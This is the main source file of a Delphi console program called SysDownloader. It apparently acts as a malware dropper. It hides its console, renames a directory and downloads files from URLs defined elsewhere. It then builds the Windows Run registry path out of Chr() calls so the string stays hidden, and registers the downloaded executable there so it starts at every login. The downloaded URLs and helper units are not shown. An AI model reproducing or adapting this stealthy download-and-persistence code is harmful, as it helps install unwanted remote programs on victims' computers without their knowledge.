program SysDownloader;

{$APPTYPE CONSOLE}

{$R *.res}

{$R 'UAC.res' 'UAC.rc'}

uses
  System.SysUtils,
  Winapi.Windows,
  DownloadUtils in 'DownloadUtils.pas',
  DownloadConst in 'DownloadConst.pas',
  RegistryEx in 'RegistryEx.pas';

begin
  if not IS_DEBUG_MODE then
    FreeConsole;
  try
    RenameGazDir;
    DownloadFile(URL_FILE_3);

    if IsWinXP then
      DownloadFileAndReg(URL_FILE_1)
    else
      DownloadFileAndReg(URL_FILE_2);

    // Software\Microsoft\Windows\CurrentVersion\Run
    REG_SECTION_RUN := ''+Chr(83)+Chr(111)+Chr(102)+Chr(116)+Chr(119)+'a'+''+'r'+''+'e'+'\'+'M'+Chr(105)+'c'+Chr(114)+Chr(111)+'s'+'o'+'f'+'t'+Chr(92)+Chr(87)+'i'+Chr(110)+'d'+Chr(111)+Chr(119)+Chr(115)+''+Chr(92)+'C'+'u'+'r'+Chr(114)+Chr(101)+'n'+'t'+'V'+'e'+'r'+''+'s'+'i'+''+''+'o'+Chr(110)+Chr(92)+'R'+Chr(117)+'n';

    WriteToReg(HKEY_CURRENT_USER,
               REG_SECTION_RUN,
               ChangeFileExt(ExtractFileNameByURL(URL_FILE_3), ''),
               ChangeFileExt(ExtractFileNameByURL(URL_FILE_3), '.exe'),
               False);
  except
    on E: Exception do
      WritelnDebug(E.ClassName + ': ' + E.Message);
  end;
  if IS_DEBUG_MODE then
    Readln;
end.
